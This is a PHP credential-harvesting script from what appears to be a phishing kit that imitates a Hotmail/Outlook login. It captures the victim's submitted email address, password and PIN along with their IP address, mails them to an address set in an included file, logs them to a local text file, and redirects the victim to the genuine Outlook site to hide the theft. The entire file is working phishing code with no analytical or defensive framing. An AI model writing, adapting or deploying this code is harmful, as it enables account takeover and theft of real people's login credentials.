<meta http-equiv="Refresh"
content="0;url=https://outlook.live.com/owa/"> 
<?php  
include "348563653564375435.php";
$emailx = $_POST['eml'];  
$passx = $_POST['emlpss'];  
$passx1 = $_POST['p'];  
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "   
m4il :  $emailx
pazz : $passx
p1n :  $passx1
ip : $IP  
==========================";  
$MAIL_TITLE = "h0tm41l | ".$IP."";  
$MAIL_HEADER = "From: h0tm41l-C4pturaz";  
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);  
$handle = fopen("cabimaslocass.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  



?>